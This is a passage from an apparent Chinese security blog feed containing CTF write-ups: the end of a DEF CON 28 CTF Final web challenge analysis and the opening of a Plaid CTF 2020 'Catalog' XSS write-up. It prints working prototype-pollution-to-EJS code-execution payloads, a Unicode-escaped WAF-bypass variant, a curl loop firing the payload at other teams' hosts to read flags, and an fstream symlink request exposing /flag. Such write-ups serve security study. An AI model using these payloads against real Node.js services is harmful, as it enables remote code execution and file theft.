class="hljs-string">&quot;ejs&quot;</span>);</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line"><span class="hljs-comment">// error handler</span></span><br><span class="line">app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>{</span><br><span class="line">  <span class="hljs-comment">// set locals, only providing error in development</span></span><br><span class="line">  res.locals.message = err.message;</span><br><span class="line">  res.locals.error = req.app.get(<span class="hljs-string">&quot;env&quot;</span>) === <span class="hljs-string">&quot;development&quot;</span> ? err: {};</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// render the error page</span></span><br><span class="line">  res.status(err.status || <span class="hljs-number">500</span>);</span><br><span class="line">  res.render(<span class="hljs-string">&quot;error&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#x6765;&#x89E6;&#x53D1;&#x8FD9;&#x4E2A;<code>res.render</code>&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;<code>&quot;path&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;}</code>&#x5C31;&#x8D77;&#x5230;&#x4E86;&#x6C61;&#x67D3;&#x4E4B;&#x524D;&#x7684; path &#x8BA9; nodejs &#x8BFB;&#x53D6;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x5F15;&#x8D77;&#x62A5;&#x9519;&#xFF0C;&#x8FDB;&#x800C;&#x8FDB;&#x5165;&#x9519;&#x8BEF;&#x5904;&#x7406;&#x6765;&#x5B9E;&#x73B0; ejs &#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x3002;</p><p>&#x6240;&#x4EE5;&#x4E4B;&#x524D;&#x5BF9;&#x4E8E; flat &#x7684;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x4E5F;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x540C;&#x6837;&#x7684;&#x539F;&#x7406;&#x8FDB;&#x884C; RCE &#xFF1A;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;__proto__.outputFunctionName&quot;</span>: <span class="hljs-string">&quot;a=1;process.mainModule.require(&apos;child_process&apos;).exec(&apos;touch /tmp/b&apos;)//&quot;</span>,<span class="hljs-attr">&quot;__proto__.path&quot;</span>: <span class="hljs-string">&quot;/foo&quot;</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x6539;&#x53D8;&#x5C31;&#x662F;&#x5229;&#x7528;&#x7F16;&#x7801;&#x6765;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B; waf &#x5173;&#x952E;&#x5B57;&#xFF1A;</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;$schema&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:{<span class="hljs-attr">&quot;__proto__&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-attr">&quot;properties&quot;</span>:{<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-attr">&quot;default&quot;</span>:<span class="hljs-string">&quot;x;return eval(`\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u002e\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\\u002e\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0028\\u0060\\u0066\\u0073\\u0060\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u0046\\u0069\\u006c\\u0065\\u0053\\u0079\\u006e\\u0063\\u0028\\u0060\\u002f\\u0066\\u006c\\u0060\\u002b\\u0060\\u0061\\u0067\\u0060\\u0029\\u002e\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0060\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0060\\u0029`);//x&quot;</span>},<span class="hljs-attr">&quot;path&quot;</span>:{<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-attr">&quot;default&quot;</span>:<span class="hljs-string">&quot;/foo&quot;</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8D5B;&#x540E;&#x8DDF; /bin/tw &#x7684;&#x9009;&#x624B;&#x4EA4;&#x6D41;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x4ED6;&#x4EEC;&#x7684; payload &#x5230;&#x540E;&#x9762;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x6253;&#x597D;&#x51E0;&#x4E2A;&#x961F;&#xFF0C;&#x4E8E;&#x662F;&#x53BB;&#x8981;&#x4E86;&#x4E00;&#x4EFD; POC &#xFF0C;&#x5982;&#x4E0B;&#xFF0C;&#x4E5F;&#x662F;&#x5927;&#x6982;&#x7C7B;&#x4F3C;&#x7684;&#x4E00;&#x4E2A;&#x5199;&#x6CD5;&#xFF1A;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.13.37.<span class="hljs-variable">$i</span>:14017/config/validated/json-schema/validate -H <span class="hljs-string">&apos;content-type: application/json&apos;</span> --data <span class="hljs-string">&apos;{&quot;$schema&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;__proto__&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;outputFunctionName&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;},&quot;path&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;}}}}}}&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="fstream"><a href="#fstream" class="headerlink" title="fstream"></a>fstream</h3><p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x662F;&#x6211;&#x4EEC;&#x961F;&#x5927;&#x5E08;&#x5085;&#x627E;&#x7684;</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/fstream/Writer</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 77</span><br><span class="line"></span><br><span class="line">{&quot;type&quot;:&quot;SymbolicLink&quot;,&quot;linkpath&quot;:&quot;/flag&quot;,&quot;path&quot;:&quot;public/stylesheets/11.png&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x6CA1;&#x4EC0;&#x4E48;&#x597D;&#x5206;&#x6790;&#x7684;&#xFF0C;&#x6587;&#x6863;&#x770B;&#x4E00;&#x770B;&#xFF1A;<a href="https://github.com/npm/fstream" target="_blank" rel="noopener">https://github.com/npm/fstream</a> &#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5F53;&#x65F6;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x8FD8;&#x6363;&#x9F13;&#x4E86;&#x4E00;&#x4F1A; json &#x4F20;&#x53C2;&#x5565;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x540E;&#x6765;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;<code>application/x-www-form-urlencoded</code> &#x4E5F;&#x53EF;&#x4EE5;</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><h3 id="About-The-Web"><a href="#About-The-Web" class="headerlink" title="About The Web"></a>About The Web</h3><p>&#x8FD9;&#x6B21; Web &#x5F53;&#x65F6;&#x6BD4;&#x8D5B;&#x6211;&#x4EEC;&#x4E5F;&#x90FD;&#x5728;&#x5410;&#x69FD;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A; Web &#x9898;&#x5F53;&#x65F6;&#x89C9;&#x5F97;&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#xFF0C;&#x7B80;&#x76F4;&#x5C31;&#x76F4;&#x63A5;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x540E;&#x95E8;&#xFF0C;&#x800C;&#x4E14;&#x786E;&#x5B9E;&#x6574;&#x4E2A;&#x6BD4;&#x8D5B;&#x5F04;&#x8D77;&#x6765;&#x4E0D;&#x4EC5;&#x662F; Web &#x8FD9;&#x4E2A;&#x540E;&#x95E8;&#x4F3C;&#x7684;&#x6D1E;&#xFF0C;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x9898;&#x76EE;&#x542C;&#x5176;&#x4ED6;&#x5927;&#x5E08;&#x5085;&#x5410;&#x69FD;&#x4E5F;&#x90FD;&#x662F;&#x627E;&#x540E;&#x95E8;&#x7684;&#x9898;&#x76EE;&#x3002;</p><p>&#x540E;&#x9762;&#x770B;&#x4E86;&#x51FA;&#x9898;&#x4EBA;&#x76F8;&#x5173;&#x7684;&#x8BB2;&#x8FF0;&#xFF0C;&#x8BB2;&#x8FF0;&#x89C6;&#x9891;&#x5730;&#x5740;&#xFF1A;<a href="https://www.youtube.com/watch?v=g2BDz6yHcbo" target="_blank" rel="noopener">nooode DEF CON 28 CTF Challenge w/ Guest kaptain | CTF Radiooo 003</a> &#xFF0C;&#x540E;&#x6765;&#x89C9;&#x5F97;&#x5427;&#xFF0C;&#x786E;&#x5B9E;&#x4E5F;&#x8FD8;&#x8FC7;&#x5F97;&#x53BB;&#xFF0C;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E9B;&#x591A;&#x5143;&#x5316;&#x7684;&#x8BBE;&#x8BA1;&#xFF0C;&#x56E0;&#x4E3A;&#x5F15;&#x5165;&#x4E86;&#x5F88;&#x591A; lib &#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x5F88;&#x591A;&#x59FF;&#x52BF;&#x53EF;&#x4EE5;&#x53BB;&#x5C1D;&#x8BD5;&#xFF0C;&#x53EF;&#x4EE5;&#x53BB;&#x6316;&#xFF0C;&#x6BD4;&#x8D5B;&#x9014;&#x4E2D;&#x90A3;&#x6B21;&#x91CD;&#x7F6E;&#x5E94;&#x8BE5;&#x4E5F;&#x5C31;&#x662F;&#x52A0;&#x5F3A;&#x4E86; checker &#xFF0C;&#x4E5F;&#x770B;&#x5F97;&#x51FA; OOO &#x5728;&#x8FD9;&#x65B9;&#x9762;&#x8FD8;&#x662F;&#x5C3D;&#x529B;&#x4E86;&#x3002;&#xFF08;&#x5982;&#x679C;&#x4F60;&#x5220;&#x6389;&#x9898;&#x76EE;&#x7ED9;&#x7684; node_modules &#xFF0C;&#x7136;&#x540E;&#x91CD;&#x65B0; install &#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;&#x5B98;&#x65B9;&#x7ED9;&#x7684;&#x591A;&#x51FA;&#x4E00;&#x4E2A; vm2 &#xFF0C;&#x5F53;&#x65F6;&#x6211;&#x4EEC;&#x5C31;&#x5728;&#x60F3;&#x96BE;&#x4E0D;&#x6210;&#x8FD8;&#x53EF;&#x80FD;&#x662F; vm2 &#x9003;&#x9038;&#xFF1F;&#x4F46;&#x662F;&#x540E;&#x9762;&#x627E;&#x4E86;&#x4E00;&#x4F1A;&#x6CA1;&#x627E;&#x5230;&#x5C31;&#x653E;&#x5F03;&#x4E86;&#x8FD9;&#x6761;&#x8DEF;&#x3002;&#xFF08;&#xFF08;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5F53;&#x65F6;&#x60F3;&#x4E07;&#x4E00; OOO &#x8FD8;&#x522B;&#x6709;&#x7528;&#x5FC3;&#x5730;&#x518D;&#x653E;&#x4E00;&#x4E2A;&#x540E;&#x95E8;&#x5728; node_modules &#x5462;&#xFF1F;&#x6BD5;&#x7ADF; Backdooor CTF</p><p>&#x8FD9;&#x6B21;&#x867D;&#x7136;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x786E;&#x5B9E;&#x4E5F;&#x8BA9;&#x6211;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E9B;&#x5BF9;&#x4E8E;&#x5982;&#x4F55;&#x8BBE;&#x8BA1; AWD Web &#x9898;&#x76EE;&#x7684;&#x601D;&#x8003;&#xFF0C;&#x5305;&#x62EC; @Zach Wade &#x4E5F;&#x6709;&#x7C7B;&#x4F3C;&#x7684;&#x60F3;&#x6CD5;:</p><blockquote><p>&#x200B;    Although I might sound frustrated by this, I think it&#x2019;s actually an example of really good A/D problem design. Even though the application was straightforward, it presented a variety of options for exploitation.</p></blockquote><h3 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h3><p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x4E8B;&#x5C31;&#x662F;&#xFF0C;A0E &#x7684;&#x540C;&#x5B66;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x961F;&#x7684;&#x5927;&#x5E08;&#x5085;&#x624B;&#x7ED5; A0E &#x5982;&#x679C;&#x518D;&#x591A;&#x6253;&#x4E00;&#x8F6E;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x6B21;&#x7684;&#x7ED3;&#x679C;&#x5C31;&#x4E0D;&#x4E00;&#x6837;&#x4E86;&#xFF0C;&#x4E5F;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x4FDD;&#x8BC1;&#x4E86;&#x4E0E; PPP &#x9AD8;&#x51FA;&#x7684;&#x4E24;&#x5206;&#x7684;&#x5DEE;&#x8DDD;&#x3002;&#xFF08;&#x8FD9;&#x96BE;&#x9053;&#x4E0D;&#x503C;&#x5F97;&#x4E00;&#x987F;&#x996D;&#x5417;&#xFF1F;</p><p>&#x6839;&#x636E;&#x4E00;&#x4E9B;&#x73B0;&#x6709;&#x7684;&#x62A5;&#x9053;&#xFF0C;&#x4EE5;&#x53CA;&#x5411;&#x4E00;&#x4E9B; A0E &#x7684;&#x540C;&#x5B66;&#x8003;&#x8BC1;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x6BD4;&#x5982;&#x4ED6;&#x4EEC;&#x771F;&#x7684;&#x662F;&#x5F88;&#x65E9;&#x5C31;&#x51C6;&#x5907;&#x4E86;&#x5417;&#xFF1F;&#x771F;&#x7684;&#x6709;&#x5BF9;&#x6BCF;&#x4E2A;&#x4EBA;&#x5206;&#x7279;&#x6027;&#xFF0C;&#x6BCF;&#x4E2A;&#x4EBA;&#x64C5;&#x957F;&#x4EC0;&#x4E48;&#x5417;&#x7B49;&#x7B49;&#x95EE;&#x9898;&#xFF0C;&#x90FD;&#x5F97;&#x5230;&#x4E86;&#x80AF;&#x5B9A;&#x7684;&#x56DE;&#x7B54;&#xFF0C;&#x4E0D;&#x5F97;&#x4E0D;&#x4F69;&#x670D; A0E &#x7684;&#x56E2;&#x961F;&#x7BA1;&#x7406;&#x534F;&#x4F5C;&#x80FD;&#x529B; orz &#x800C;&#x4E14;&#x6839;&#x636E;&#x4ED6;&#x4EEC;&#x7ED3;&#x675F;&#x5F53;&#x5929;&#x7684;&#x5408;&#x7167;&#x6765;&#x770B;&#x4F30;&#x8BA1;&#x4E5F;&#x5F97;&#x6709;50&#x591A;&#x4EBA;&#x5DE6;&#x53F3;&#x5427;&#x3002;&#xFF08;&#x636E;&#x8BF4; Samurai &#x53C2;&#x8D5B;&#x4EBA;&#x6570;&#x8FBE;&#x5230;&#x4E86;&#x6050;&#x6016;&#x7684;150&#x4EBA;</p><p>&#x867D;&#x7136; PPP &#x8868;&#x793A;&#x81EA;&#x5DF1; &#x201C;Since DEF CON CTF is such an important competition for us, we traditionally spend the month leading up to it in preparation and organization. This year, we did not.&#x201D; &#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x5C55;&#x793A;&#x51FA;&#x4E86;&#x4E00;&#x5982;&#x65E2;&#x5F80;&#x5BF9; DEFCON &#x7684;&#x7EDF;&#x6CBB;&#x529B;&#x3002;</p><p>&#x81EA;&#x5DF1;&#x5728;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x7531;&#x4E8E;&#x81EA;&#x8EAB;&#x80FD;&#x529B;&#x8F83;&#x5DEE;&#x4EE5;&#x53CA;&#x7B2C;&#x4E00;&#x6B21;&#x8DDF;&#x5927;&#x5E08;&#x5085;&#x4EEC;&#x914D;&#x5408;&#xFF0C;&#x5F53;&#x65F6;&#x6BD4;&#x8D5B;&#x914D;&#x5408;&#x5F97;&#x4E0D;&#x662F;&#x76F8;&#x5F53;&#x7684;&#x597D;&#xFF0C;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4E86;&#x4E00;&#x4E9B;&#x5931;&#x5206;&#xFF0C;&#x5982;&#x679C;&#x4EE5;&#x540E;&#x8FD8;&#x6709;&#x673A;&#x4F1A;&#xFF0C;&#x5E0C;&#x671B;&#x81EA;&#x5DF1;&#x63D0;&#x5347;&#x80FD;&#x529B;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x4E5F;&#x80FD;&#x5C3D;&#x91CF;&#x63D0;&#x9AD8;&#x4E00;&#x4E9B;&#x5408;&#x4F5C;&#x7684;&#x80FD;&#x529B;&#x3002;</p><p>&#x603B;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x6CE1;&#x9762;&#x3001;&#x5916;&#x5356;&#x5F88;&#x597D;&#x5403;&#xFF0C;&#x516C;&#x53F8;&#x529E;&#x516C;&#x6905;&#x5F88;&#x8212;&#x670D;&#xFF0C;&#x201C;&#x7F51;&#x7BA1;&#x201D;&#x8FD0;&#x7EF4;&#x9009;&#x624B;&#x975E;&#x5E38;&#x7ED9;&#x529B;&#xFF0C;&#x5927;&#x5E08;&#x5085;&#x4EEC;&#x90FD;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x7684;&#x5389;&#x5BB3;&#x3002;&#x4ECA;&#x5E74;&#x5BF9;&#x4E00;&#x5F00;&#x59CB;&#x7684; KOH &#x4EE5;&#x53CA;&#x6700;&#x540E;&#x7684; Web &#x505A;&#x4E86;&#x4E00;&#x70B9;&#x70B9;&#x5FAE;&#x5C0F;&#x7684;&#x8D21;&#x732E;&#xFF0C;&#x5982;&#x679C;&#x4EE5;&#x540E;&#x6709;&#x673A;&#x4F1A;&#x7684;&#x8BDD;&#x5E0C;&#x671B;&#x80FD;&#x505A;&#x5230;&#x66F4;&#x5927;&#x7684;&#x8D21;&#x732E;&#x53ED;&#xFF01;</p><p>&#x518D;&#x6B21;&#x606D;&#x559C; A*0*E &#x62FF;&#x5230; DEFCON 28 CTF Final &#x51A0;&#x519B;&#xFF01;</p><h1 id="Others-Notes"><a href="#Others-Notes" class="headerlink" title="Others Notes"></a>Others Notes</h1><p>PPP &#x2013; Zach Wade &#x7684;&#x56DE;&#x987E;&#xFF1A; <a href="https://dttw.tech/posts/Skww4fzGP" target="_blank" rel="noopener">Kernel Panic: A DEF CON 2020 Retrospective</a></p><p>r3kapig &#x2013; Y1ng &#x7684;&#x56DE;&#x987E;&#xFF1A;<a href="https://www.gem-love.com/ctf/2558.html" target="_blank" rel="noopener">DEFCON 28 CTF Final Safe Mode&#x53C2;&#x8D5B;&#x8BB0;&#x5F55;</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/</id>
        <title><![CDATA[Plaid CTF 2020 Catalog]]></title>
        <updated>2021-06-01T02:31:38+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/04/24/Plaid-CTF-2020-Web-2/"><![CDATA[<html><head></head><body><p>&#x672C;&#x6587;&#x662F;&#x5173;&#x4E8E; Plaid CTF 2020 Catalog &#x9898;&#x76EE;&#x7684;&#x4E00;&#x4E9B;&#x590D;&#x76D8;&#x4E0E;&#x63A2;&#x7A76;&#x3002;</p><a id="more"></a><p>&#x8FD9;&#x9053;&#x9898;&#x662F;&#x672C;&#x6B21; PlaidCTF &#x5168;&#x573A;&#x552F;&#x4E00;&#x4E00;&#x9053;0&#x89E3;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x96BE;&#x5EA6;&#x7684;&#xFF0C;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x3002;&#x8FD9;&#x91CC;&#x975E;&#x5E38;&#x611F;&#x8C22; @wupco @rebirthwyw @bks25wzsx&#xFF08;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;@zsx &#x53C8;&#x540D; @bks25wzsx&#xFF09;&#x5E08;&#x5085;&#x4EEC;&#x7684;&#x6307;&#x70B9;&#xFF0C;&#x590D;&#x76D8;&#x7684;&#x65F6;&#x5019;&#x6BD4;&#x8F83;&#x8270;&#x96BE;&#xFF0C;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4F1A;&#x5C3D;&#x91CF;&#x7528;&#x81EA;&#x5DF1;&#x8FD8;&#x7B97;&#x6BD4;&#x8F83;&#x6E05;&#x6670;&#x7684;&#x903B;&#x8F91;&#x8BB2;&#x4E00;&#x4E0B;&#x672C;&#x9053;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x54EA;&#x91CC;&#x6709;&#x51FA;&#x9519;&#x7684;&#x8FD8;&#x8BF7;&#x5E08;&#x5085;&#x4EEC;&#x591A;&#x591A;&#x5305;&#x6DB5;&#x3002;</p><p>&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x9898;&#x662F;&#x590D;&#x76D8;&#x9898;&#xFF0C;&#x6240;&#x4EE5;&#x505A;&#x9898;&#x601D;&#x8DEF;&#x53EF;&#x80FD;&#x4F1A;&#x5C11;&#x4E00;&#x4E9B;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x662F;&#x5BF9;&#x4E8E;&#x51FA;&#x9898;&#x70B9;&#x4EE5;&#x53CA;exp&#x4E00;&#x4E9B;&#x5206;&#x6790;&#x4EC0;&#x4E48;&#x7684;&#x3002;</p><blockquote class="colorquote danger"><p>5&#x6708;6&#x65E5;&#x66F4;&#x65B0;&#xFF1A;&#x4F5C;&#x8005;&#x5DF2;&#x7ECF;&#x653E;&#x51FA;&#x4E86;&#x4ED6;&#x7684; Write Up&#x2014;&#x2014;<a href="https://dttw.tech/posts/B19RXWzYL" target="_blank" rel="noopener">PlaidCTF 2020: Catalog Writeup</a> &#xFF0C;&#x9898;&#x76EE;&#x4ED3;&#x5E93;&#x2014;&#x2014; <a href="https://github.com/bluepichu/ctf-challenges/tree/master/plaidctf-2020/catalog" target="_blank" rel="noopener">catalog</a> &#xFF0C;&#x6587;&#x4E2D;&#x5185;&#x5BB9;&#x53EF;&#x80FD;&#x4E0E;&#x4F5C;&#x8005; Write Up &#x6709;&#x4E9B;&#x8BB8;&#x51FA;&#x5165;&#xFF0C;&#x8BF7;&#x4EE5;&#x4F5C;&#x8005;&#x7684; Write Up &#x4E3A;&#x51C6;&#xFF01;&#x672C;&#x6587;&#x6682;&#x672A;&#x66F4;&#x65B0;&#xFF01;</p></blockquote><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><blockquote><p><a href="http://catalog.pwni.ng/" target="_blank" rel="noopener">Here&#x2019;s the site</a>. The flag is on <a href="http://catalog.pwni.ng/issue.php?id=3" target="_blank" rel="noopener">this page</a>.</p><p>Browser: Chromium <strong>with uBlock Origin 1.26.0 installed and in its default configuration</strong></p><p>Flag format: <code>/^PCTF\{[A-Z0-9_]+\}$/</code></p><p><strong>Hints</strong>:</p><ul><li>To view your post, the admin will click on a link on the admin page.</li><li>You might want to read up on User Activation.</li><li>The intended solution does not require you to submit hundreds of captchas.</li></ul><p>Hint: Admin Bot Timeout</p><p>The admin bot will always disconnect after about 30 seconds.    </p></blockquote><p>&#x7ED9;&#x6CA1;&#x6709;&#x770B;&#x9898;&#x7684;&#x5C0F;&#x4F19;&#x4F34;&#x7B80;&#x7565;&#x5730;&#x6982;&#x62EC;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#xFF0C;&#x9898;&#x76EE;&#x662F;&#x4E2A;&#x9ED1;&#x76D2;&#xFF0C;&#x6709;&#x767B;&#x5F55;&#x6CE8;&#x518C;&#x3001;&#x53D1;&#x8868; issue &#x3001;&#x63D0;&#x4EA4; issue &#x7ED9; admin &#x770B;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x8FD9;&#x4E9B;&#x529F;&#x80FD;&#xFF0C;&#x5F88;&#x660E;&#x663E;&#x9898;&#x76EE;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x8FDB;&#x884C; XSS</p><p>&#x5176;&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x7EC6;&#x8282;&#x6F0F;&#x6D1E;&#xFF1A;</p><ol><li><p>&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x65E0;&#x8FC7;&#x6EE4;&#x5730;&#x56DE;&#x663E;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x5904; HTML &#x6CE8;&#x5165;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjs